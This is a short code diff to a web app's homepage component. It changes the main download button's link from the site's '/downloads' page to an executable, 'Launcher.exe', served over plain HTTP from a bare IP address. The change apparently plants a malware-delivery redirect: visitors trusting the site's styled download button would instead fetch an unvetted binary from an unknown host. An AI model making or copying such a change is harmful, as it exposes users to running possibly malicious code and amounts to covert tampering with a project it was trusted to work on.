@@ -134,7 +134,7 @@ export default function HomePage() {
             {/* CTAs */}
             <div className="flex flex-wrap items-center gap-4 pt-2">
               <Link
-                href="/downloads"
+                href="http://82.38.28.139/download/Launcher.exe"
                 className="flex items-center gap-2.5 px-6 py-3.5 bg-gradient-to-r from-amber-400 via-amber-500 to-yellow-500 hover:from-amber-300 hover:to-amber-400 text-black font-bold text-sm rounded shadow-lg shadow-amber-500/25 transition-all transform hover:-translate-y-0.5 whitespace-nowrap"
               >
                 <Download className="w-5 h-5 text-black" />
